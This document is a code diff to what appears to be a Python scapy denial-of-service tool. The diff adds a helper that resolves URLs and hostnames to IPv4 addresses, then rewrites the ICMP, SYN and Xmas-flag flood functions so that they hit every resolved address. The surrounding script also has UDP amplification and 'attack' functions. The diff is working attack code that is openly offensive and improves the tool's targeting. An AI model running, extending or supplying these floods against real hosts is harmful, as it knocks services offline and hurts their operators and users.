@@ -1,3 +1,5 @@
+from urllib.parse import urlparse
+
 from scapy.all import *
 from scapy.layers.inet import IP, ICMP, TCP
 
@@ -9,6 +11,47 @@ import threading
 import time
 
 loops = 10000
+
+
+def resolve_to_ipv4(target: str) -> list[str]:
+    """
+    Resolves a hostname or URL to a list of its unique IPv4 addresses.
+
+    This function can handle full URLs (e.g., 'https://www.google.com/search')
+    and simple hostnames (e.g., 'google.com').
+
+    :param target: The URL or hostname string to resolve.
+    :return: A list of unique IPv4 address strings, or an empty list if
+             resolution fails or no IPv4 records are found.
+    """
+    try:
+        # Prepend a scheme if one is missing to ensure urlparse works correctly
+        if "://" not in target:
+            target = "http://" + target
+
+        # Extract the hostname (e.g., 'www.google.com') from the full URL
+        hostname = urlparse(target).hostname
+
+        if not hostname:
+            # urlparse failed to find a hostname
+            return []
+
+        # Get address information, filtering for the IPv4 family
+        # socket.AF_INET specifies IPv4
+        addr_info = socket.getaddrinfo(hostname, None, family=socket.AF_INET)
+
+        # The result is a list of tuples. The IP is in the 4th element's 0th index.
+        # Use a set comprehension for automatic deduplication of IPs.
+        ips = {item[4][0] for item in addr_info}
+
+        return sorted(list(ips))
+
+    except socket.gaierror:
+        # This error occurs if DNS resolution fails (e.g., domain doesn't exist)
+        return []
+    except Exception:
+        # Catch any other unexpected errors
+        return []
 
 
 def send_packet(amplifier, host, port):
@@ -89,27 +132,33 @@ def attack_UDP(method, host, port, duration, threads_per_method=100):
     print(f"--- Test function for {method} has finished. ---")
 
 
-def icmpflood(target, cycle):
-    for x in range(0, int(cycle)):
-        send(IP(dst=target) / ICMP())
+def icmpflood(target_url, cycle):
+    targets = resolve_to_ipv4(target_url)
+    for target in targets:
+        for x in range(0, int(cycle)):
+            send(IP(dst=target) / ICMP())
 
 
-def synflood(target, targetPort, cycle):
-    for x in range(0, int(cycle)):
-        send(IP(dst=target) / TCP(dport=targetPort,
-                                  flags="S",
-                                  seq=RandShort(),
-                                  ack=RandShort(),
-                                  sport=RandShort()))
+def synflood(target_url, targetPort, cycle):
+    targets = resolve_to_ipv4(target_url)
+    for target in targets:
+        for x in range(0, int(cycle)):
+            send(IP(dst=target) / TCP(dport=targetPort,
+                                      flags="S",
+                                      seq=RandShort(),
+                                      ack=RandShort(),
+                                      sport=RandShort()))
 
 
-def xmasflood(target, targetPort, cycle):
-    for x in range(0, int(cycle)):
-        send(IP(dst=target) / TCP(dport=targetPort,
-                                  flags="FSRPAUEC",
-                                  seq=RandShort(),
-                                  ack=RandShort(),
-                                  sport=RandShort()))
+def xmasflood(target_url, targetPort, cycle):
+    targets = resolve_to_ipv4(target_url)
+    for target in targets:
+        for x in range(0, int(cycle)):
+            send(IP(dst=target) / TCP(dport=targetPort,
+                                      flags="FSRPAUEC",
+                                      seq=RandShort(),
+                                      ack=RandShort(),
+                                      sport=RandShort()))
 
 
 # Parse inputs
